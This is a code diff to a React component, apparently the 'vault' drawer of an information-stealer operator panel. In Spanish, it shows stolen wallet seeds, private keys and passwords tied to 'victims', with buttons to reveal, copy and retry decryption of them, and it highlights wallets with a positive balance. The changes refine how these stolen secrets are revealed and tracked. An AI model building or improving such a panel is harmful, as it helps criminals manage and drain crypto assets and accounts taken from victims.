@@ -6,7 +6,7 @@ import { toast } from 'sonner';
 import { api, ApiError } from '@/lib/api';
 import { useApi, mutate } from '@/hooks/useApi';
 import type { Credential, VaultWallet } from '@/lib/types';
-import { ago, copy, dateTime, mask } from '@/lib/format';
+import { ago, balanceNumber, balanceTone, copy, dateTime, mask } from '@/lib/format';
 import { Badge } from '@/components/ui/badge';
 import { Button } from '@/components/ui/button';
 import { SkeletonRows } from '@/components/ui/table';
@@ -40,9 +40,18 @@ export function VaultDrawer({ walletId, onClose }: { walletId: string | null; on
   const [revealed, setRevealed] = useState<Record<string, string>>({});
   const [busy, setBusy] = useState('');
   const panel = useRef<HTMLDivElement>(null);
+  const opener = useRef<HTMLElement | null>(null);
 
   useEffect(() => {
-    if (walletId) panel.current?.focus();
+    if (walletId) {
+      opener.current = document.activeElement as HTMLElement | null;
+      panel.current?.focus();
+      document.body.style.overflow = 'hidden';
+    } else {
+      opener.current?.focus?.();
+      document.body.style.overflow = '';
+    }
+    return () => { document.body.style.overflow = ''; };
   }, [walletId]);
 
   useEffect(() => {
@@ -67,12 +76,12 @@ export function VaultDrawer({ walletId, onClose }: { walletId: string | null; on
 
   if (!walletId) return null;
 
-  async function reveal(kind: string, credential?: boolean, id?: string): Promise<string | null> {
-    setBusy(kind);
+  async function reveal(secretId: string, kind: string, credential?: boolean, id?: string): Promise<string | null> {
+    setBusy(secretId);
     try {
-      const path = credential ? `/vault/credentials/${id}/reveal` : `/vault/wallets/${walletId}/reveal?kind=${encodeURIComponent(kind)}`;
+      const path = credential ? `/vault/credentials/${id}/reveal` : `/vault/wallets/${walletId}/reveal?secretId=${encodeURIComponent(secretId)}&kind=${encodeURIComponent(kind)}`;
       const data = await api<{ value: string }>(path);
-      setRevealed((current) => ({ ...current, [credential ? `c:${id}` : kind]: data.value }));
+      setRevealed((current) => ({ ...current, [credential ? `c:${id}` : secretId]: data.value }));
       return data.value;
     } catch (caught) {
       toast.error(caught instanceof ApiError ? caught.message : 'No se pudo revelar');
@@ -84,19 +93,19 @@ export function VaultDrawer({ walletId, onClose }: { walletId: string | null; on
 
   async function copyCredential(credential: Credential) {
     const key = `c:${credential.id}`;
-    const value = revealed[key] ?? await reveal('password', true, credential.id);
+    const value = revealed[key] ?? await reveal(credential.id, 'password', true, credential.id);
     if (!value) return;
     copy(value);
     toast.success('Contraseña copiada');
   }
 
-  async function copyKind(kind: string) {
+  async function copyKind(secretId: string, kind: string) {
     try {
-      let value = revealed[kind];
+      let value = revealed[secretId];
       if (!value) {
-        const data = await api<{ value: string }>(`/vault/wallets/${walletId}/reveal?kind=${encodeURIComponent(kind)}`);
+        const data = await api<{ value: string }>(`/vault/wallets/${walletId}/reveal?secretId=${encodeURIComponent(secretId)}&kind=${encodeURIComponent(kind)}`);
         value = data.value;
-        setRevealed((current) => ({ ...current, [kind]: value }));
+        setRevealed((current) => ({ ...current, [secretId]: value }));
       }
       copy(value);
       toast.success(`${kind === 'seed' ? 'Seed' : kind === 'private_key' ? 'Clave' : 'Contraseña'} copiada`);
@@ -140,16 +149,16 @@ export function VaultDrawer({ walletId, onClose }: { walletId: string | null; on
               <StateChip state={data.state} />
               <Badge>{data.kind}</Badge>
               {data.address ? <button className="chip" onClick={() => { copy(data.address!); toast.success('Dirección copiada'); }} title={data.address}>{mask(data.address, 12)} <Copy className="h-2.5 w-2.5" /></button> : <span className="chip">address —</span>}
-              <span className={cn('chip', data.balance && data.balance !== '0' && 'border-warn/40 text-warn')}>balance {data.balance ?? '—'}</span>
+              <span className={cn('chip', balanceNumber(data.balance) > 0 && 'border-warn/40 text-warn')}>balance <span className={balanceTone(data.balance)}>{data.balance ?? '—'}</span></span>
               <Link href={`/victims?select=${data.victim.id}&tab=boveda`} className="chip border-brand/40 text-brand">abrir víctima</Link>
             </div>
           ) : null}
           {data?.reason ? <p className="mt-2 text-2xs text-muted">motivo: {data.reason}</p> : null}
           {data?.decryptError ? <p className="mt-2 rounded border border-bad/30 bg-bad/10 p-2 text-2xs text-bad"><AlertTriangle className="mr-1 inline h-3 w-3" />{data.decryptError}</p> : null}
           <div className="mt-3 flex flex-wrap gap-1.5">
-            <Button size="sm" variant="secondary" disabled={!seed} onClick={() => copyKind('seed')}><Copy className="h-3 w-3" /> Copiar seed</Button>
-            <Button size="sm" variant="secondary" disabled={!key} onClick={() => copyKind('private_key')}><KeyRound className="h-3 w-3" /> Copiar clave</Button>
-            <Button size="sm" variant="secondary" disabled={!password} onClick={() => copyKind('password')}><Copy className="h-3 w-3" /> Copiar contraseña</Button>
+            <Button size="sm" variant="secondary" disabled={!seed} onClick={() => seed && copyKind(seed.id, 'seed')}><Copy className="h-3 w-3" /> Copiar seed</Button>
+            <Button size="sm" variant="secondary" disabled={!key} onClick={() => key && copyKind(key.id, key.kind)}><KeyRound className="h-3 w-3" /> Copiar clave</Button>
+            <Button size="sm" variant="secondary" disabled={!password} onClick={() => password && copyKind(password.id, password.kind)}><Copy className="h-3 w-3" /> Copiar contraseña</Button>
             <Button size="sm" variant="secondary" loading={busy === 'retry'} onClick={retry}><RefreshCw className="h-3 w-3" /> Reintentar descifrado</Button>
             <Button size="sm" variant="ghost" onClick={() => { copy(data?.path ?? ''); toast.success('Ruta copiada'); }}><FolderOpen className="h-3 w-3" /> Abrir carpeta</Button>
           </div>
@@ -165,7 +174,7 @@ export function VaultDrawer({ walletId, onClose }: { walletId: string | null; on
                 {data?.secrets.length === 0 ? (
                   <p className="rounded border border-line p-3 text-xs text-muted">Sin secretos. Pulsa Escanear wallets o Reintentar descifrado.</p>
                 ) : data?.secrets.map((secret) => {
-                  const value = revealed[secret.kind];
+                  const value = revealed[secret.id];
                   const isSeed = secret.kind === 'seed' || secret.kind === 'mnemonic';
                   return (
                     <div key={secret.id} className="mb-2 rounded-lg border border-line bg-panel-2/40 p-3">
@@ -186,7 +195,7 @@ export function VaultDrawer({ walletId, onClose }: { walletId: string | null; on
                         <p className="mt-2 break-all font-mono text-xs text-muted">{secret.preview}</p>
                       )}
                       <div className="mt-2 flex gap-1">
-                        <Button size="sm" variant="ghost" loading={busy === secret.kind} onClick={() => value ? setRevealed((current) => { const next = { ...current }; delete next[secret.kind]; return next; }) : reveal(secret.kind)}>
+                        <Button size="sm" variant="ghost" loading={busy === secret.id} onClick={() => value ? setRevealed((current) => { const next = { ...current }; delete next[secret.id]; return next; }) : reveal(secret.id, secret.kind)}>
                           {value ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />} {value ? 'ocultar' : 'ver'}
                         </Button>
                         <Button size="sm" variant="ghost" onClick={() => { copy(value ?? secret.preview); toast.success('Copiado'); }}>copiar</Button>
@@ -205,7 +214,7 @@ export function VaultDrawer({ walletId, onClose }: { walletId: string | null; on
                       <p className="truncate text-2xs text-muted">{credential.username || '—'} · {credential.state}</p>
                     </div>
                     <span className="font-mono text-2xs">{revealed[`c:${credential.id}`] ?? credential.passwordPreview ?? '—'}</span>
-                    <Button size="sm" variant="ghost" loading={busy === credential.id} onClick={() => reveal('password', true, credential.id)}><Eye className="h-3 w-3" /></Button>
+                    <Button size="sm" variant="ghost" loading={busy === credential.id} onClick={() => reveal(credential.id, 'password', true, credential.id)}><Eye className="h-3 w-3" /></Button>
                     <Button size="sm" variant="ghost" onClick={() => void copyCredential(credential)}><Copy className="h-3 w-3" /></Button>
                   </div>
                 ))}
